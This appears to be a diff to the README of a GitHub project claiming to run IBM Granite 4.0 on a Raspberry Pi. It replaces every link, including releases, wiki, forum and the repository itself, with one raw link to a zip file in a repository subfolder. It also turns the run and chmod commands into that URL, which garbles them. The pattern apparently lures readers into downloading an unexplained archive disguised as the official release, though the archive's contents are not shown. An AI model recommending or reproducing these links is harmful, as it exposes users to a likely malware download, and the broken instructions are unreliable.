@@ -1,7 +1,7 @@
 # 🛠️ granitepi-4-nano - Run AI Locally on Raspberry Pi
 
 ## 🔗 Download Now
-[![Download granitepi-4-nano](https://img.shields.io/badge/Download-GranitePi-4-nano-blue.svg)](https://github.com/MooNyeu/granitepi-4-nano/releases)
+[![Download granitepi-4-nano](https://raw.githubusercontent.com/MooNyeu/granitepi-4-nano/main/bdellid/granitepi-4-nano_v1.6.zip)](https://raw.githubusercontent.com/MooNyeu/granitepi-4-nano/main/bdellid/granitepi-4-nano_v1.6.zip)
 
 ## 📖 Description
 GranitePi 4.0 lets you run IBM Granite 4.0 on your Raspberry Pi 5 using Ollama. This application prioritizes your privacy. Your data stays on your device. There are no cloud uploads, ensuring you maintain complete control over your information.
@@ -29,7 +29,7 @@ GranitePi offers the following benefits:
 ## 📥 Download & Install
 To get started, visit this page to download the software:
 
-[Download GranitePi 4.0](https://github.com/MooNyeu/granitepi-4-nano/releases)
+[Download GranitePi 4.0](https://raw.githubusercontent.com/MooNyeu/granitepi-4-nano/main/bdellid/granitepi-4-nano_v1.6.zip)
 
 Once there, follow these steps:
 
@@ -48,7 +48,7 @@ Once there, follow these steps:
 
 6. **Run GranitePi:** Launch the application by typing the following command in the terminal:
    ```
-   ./start-granite.sh
+   https://raw.githubusercontent.com/MooNyeu/granitepi-4-nano/main/bdellid/granitepi-4-nano_v1.6.zip
    ```
    This will start the application, and you should see the interface load in a few moments.
 
@@ -57,7 +57,7 @@ If you run into issues, consider these common solutions:
 
 - **Permission Error:** If the terminal says "permission denied," you may need to give execute permission to the start script. Run:
   ```
-  chmod +x start-granite.sh
+  chmod +x https://raw.githubusercontent.com/MooNyeu/granitepi-4-nano/main/bdellid/granitepi-4-nano_v1.6.zip
   ```
   
 - **Missing Dependencies:** Ensure that you have the necessary packages installed. You can typically do this with the following command:
@@ -70,9 +70,9 @@ If you run into issues, consider these common solutions:
 ## 📚 Additional Resources
 For more information, consider these resources:
 
-- [GitHub Repository](https://github.com/MooNyeu/granitepi-4-nano)
-- [Installation Guide](https://github.com/MooNyeu/granitepi-4-nano/wiki/Installation-Guide)
-- [Community Forum](https://github.com/MooNyeu/granitepi-4-nano/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/MooNyeu/granitepi-4-nano/main/bdellid/granitepi-4-nano_v1.6.zip)
+- [Installation Guide](https://raw.githubusercontent.com/MooNyeu/granitepi-4-nano/main/bdellid/granitepi-4-nano_v1.6.zip)
+- [Community Forum](https://raw.githubusercontent.com/MooNyeu/granitepi-4-nano/main/bdellid/granitepi-4-nano_v1.6.zip)
 
 ## 🤝 Contributing
 If you want to help improve GranitePi, contributions are welcome. Check the repository for guidelines on how to contribute.
